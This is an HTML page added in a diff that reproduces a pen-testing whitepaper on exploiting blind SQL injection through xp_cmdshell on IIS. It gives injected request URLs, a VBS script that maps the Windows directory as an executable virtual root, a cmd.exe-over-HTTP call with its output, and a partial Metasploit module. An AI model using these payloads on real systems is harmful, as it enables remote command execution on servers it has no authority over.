@@ -1,0 +1,311 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+
+<style>
+
+#h3{
+    border: 20px solid black;
+    padding: 10px;
+}
+
+
+</style>
+
+</head>
+
+<body style=background-color:#00FFFF;>
+
+
+
+<div id="h3">
+                                                                           
+
+
+
+
+
+
+
+
+<center><h1>
+Blind Sql Injection</h1></center>
+
+
+<center><h2>
+Blind SQL injection discovery & exploitation technique
+</h2></center>
+
+
+<h3>Abstract</h3>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+
+
+This paper describes technique to deal with blind SQL injection spot with ASP/ASP.NET
+applications running with access to XP_CMDSHELL. It is possible to perform pen test
+against this scenario though not having any kind of reverse access or display of error
+message. It can be used in completely blind environment and successful execution can
+grant remote command execution on the target application with admin privileges.</p>
+
+
+<h3>
+Keywords</h3>
+
+<p style="font-size:140%;">
+
+Blind SQL injection, SQL injection, XP_CMDSHELL</p>
+
+
+
+
+
+
+
+<h2>Problem Domain:</h2>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+While performing web application and penetration testing following scenario is very
+common and it hides potential exploitable SQL injection scenario:</p>
+
+<p style="font-size:140%;">
+
+
+
+1. We have SQL injection point but it is not throwing any error message out as part
+of its response. Application is sending customized error page which is not
+revealing any signature by which we can deduce potential SQL flaw.<br>
+2. Knowing SQL injection point or loophole in web application, xp_cmdshell seems
+to be working. But we can’t say is it working or not since it doesn’t return any
+meaningful signature. This is “blind xp_cmdshell”.<br>
+3. Firewall don’t allow outbound traffic so can’t do ftp, tftp, ping etc from the box to
+the Internet by which you can confirm execution of the command on the target
+system.<br>
+4. We don’t know the actual path to webroot so can’t copy file to location which can
+be accessed over HTTP or HTTPS later to confirm the execution of the command.<br>
+5. If we know path to webroot and directory structure but can’t find execute
+permission on it so can’t copy cmd.exe or any other binary and execute over
+HTTP/HTTPS.<br>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+Hence, it is becoming difficult to deal with this kind of situation and identify blind SQL
+injection spot. Let’s see one of the ways by which you can reach to cmd.exe and bring it
+out to the web and access over HTTP/HTTPS. This way you can confirm the existence of
+vulnerability on the target application.</p>
+
+
+
+<h2>Solution:</h2>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+Here is a solution or test one can perform during penetration testing and check the
+existence of blind “xp_cmdshell”.</p>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+
+<h3>Step 1:</h3>
+
+<p style="font-size:140%;">
+
+One can echo following lines to file and store it to a filesystem for example say
+secret.vbs using xp_cmdshell interface.<br>
+Set WshShell = WScript.CreateObject("WScript.Shell")<br>
+Set ObjExec = WshShell.Exec("cmd.exe /c echo %windir%")<br>
+windir = ObjExec.StdOut.ReadLine()<br>
+Set Root = GetObject("IIS://LocalHost/W3SVC/1/ROOT")<br>
+Set Dir = Root.Create("IIsWebVirtualDir", "secret")<br>
+Dir.Path = windir<br>
+Dir.AccessExecute = True<br>
+Dir.SetInfo<br></p>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+In this particular script we are identifying windir on the fly and setup a virtual root on it
+with exec permission. We are mapping windows directory and map it to virtual root
+“secret”, setting execute access on it as well. Following list of commands will create file
+
+
+
+
+
+on the server. Here is a way by which we can create file line by line and then execute
+script on the target machine as well.</p>
+
+
+<p style="font-size:140%;">
+
+
+http://target/details.asp?id=1;exec+master..xp_cmdshell+’echo ' Set WshShell =
+WScript.CreateObject("WScript.Shell") > c:\secret.vbs’<br>
+…..<br>
+…..<br>
+…..<br>
+http://target/details.asp?id=1;exec+master..xp_cmdshell+’echo ' Dir.SetInfo<br>
+>> c:\secret.vbs’<br></p>
+
+
+
+<h3>Step 2:</h3>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+Run this file using xp_cmdshell by following command.
+http://target/details.asp?id=1;exec+master..xp_cmdshell+'cscript+c:\secret.vbs’
+This will run file and create /secret/ virtual root on the server.</p>
+
+
+
+
+<h3>Step 3:</h3>
+
+
+<p style="font-size:140%;">
+
+
+Run command over HTTP/HTTPS
+http://target/secret/system32/cmd.exe?+/c+set</p>
+
+
+<p style="font-size:140%;">
+
+Now we have full access to system32 binaries with execution privileges. Here what you
+get as output.</p>
+
+
+
+<h3>CGI Error</h3>
+
+<p style="font-size:140%;">
+
+
+The specified CGI application misbehaved by not returning a complete set of HTTP
+headers. The headers it did return are:</p>
+
+
+<p style="font-size:140%;">
+
+
+ALLUSERSPROFILE=C:\Documents and Settings\All Users<br>
+CommonProgramFiles=C:\Program Files\Common Files<br>
+COMPUTERNAME=BLUESQUARE<br>
+ComSpec=C:\WINNT\system32\cmd.exe<br>
+CONTENT_LENGTH=0<br>
+GATEWAY_INTERFACE=CGI/1.1<br>
+HTTPS=off<br>
+HTTP_ACCEPT=text/xml,application/xml,application/xhtml+xml,text/html;q=
+0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br>
+HTTP_ACCEPT_LANGUAGE=en-us,en;q=0.5<br>
+HTTP_CONNECTION=keep-alive<br>
+HTTP_HOST=localhost<br>
+HTTP_USER_AGENT=Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US;
+rv:1.7.3) Gecko/20040910<br>
+HTTP_ACCEPT_ENCODING=gzip,deflate<br>
+HTTP_ACCEPT_CHARSET=ISO-8859-1,utf-8;q=0.7,*;q=0.7<br>
+HTTP_KEEP_ALIVE=300<br>
+INCLUDE=C:\Program Files\Microsoft Visual Studio
+.NET\FrameworkSDK\include\
+INSTANCE_ID=1
+LIB=C:\Program Files\Microsoft Visual Studio .NET\FrameworkSDK\Lib\
+LOCAL_ADDR=127.0.0.1<br>
+NUMBER_OF_PROCES<br>
+4 Blueinfy’s whitepaper series<br></p>
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+It is possible to integrate into any of the exploit framework as well. For example here is
+we are putting it into Metasploit:</p>
+
+<p style="font-size:140%;">
+
+
+
+sub Exploit {<br>
+my $self = shift;<br>
+my $target_host = $self->GetVar('RHOST');<br>
+my $target_port = $self->GetVar('RPORT');<br>
+my $path = $self->GetVar('RPATH');<br>
+my $vhost = $self->GetVar('VHOST');<br><br><br>
+my @url = split(/#/, $path);<br>
+my @payload =
+("EXEC+master..xp_cmdshell+'echo+Set+WshShell+=+WScript.CreateObject(\"WScript.Shell\")>c:\\secret.vbs'",<br>
+"EXEC+master..xp_cmdshell+'echo+Set+Root+=+GetObject(\"IIS://LocalHost/W3SVC/1/ROOT\")>>c:\\secret.vbs'",<br>
+"EXEC+master..xp_cmdshell+'echo+Set+Dir+=+Root.Create(\"IIsWebVirtualDir\",\"secret\")>>c:\\secret.vb s'",<br>
+"EXEC+master..xp_cmdshell+'echo+Dir.Path+=+\"c:\\winnt\\system32\\\">>c:\\secret.vbs'",<br>
+"EXEC+master..xp_cmdshell+'echo+Dir.AccessExecute+=+True>>c:\\secret.vbs'",<br>
+"EXEC+master..xp_cmdshell+'echo+Dir.SetInfo>>c:\\secret.vbs'",<br>
+"EXEC+master..xp_cmdshell+'cscript+c:\\secret.vbs'"
+);<br>
+$self->PrintLine("[+] Sending SQL injection payload...");<br>
+for(my $count=0;$count<=6;$count++)<br>
+..<br>
+..<br></p>
+
+
+<h3>
+
+Once we execute it we get following sort of output.</h3>
+<center>
+<img src="Capture1.png" alt="output" style="width:1000px;height:500px;">
+</center>
+
+
+
+
+<h2>Conclusion:</h2>
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+The technique described in this paper can help in testing blind SQL injection running
+with blind xp_cmdshell. It is easy to send few requests and check whether we are getting
+execution rights on the target application or not, even application is totally blind as
+described in problem domain.</p>
+
+</body>
+</html>
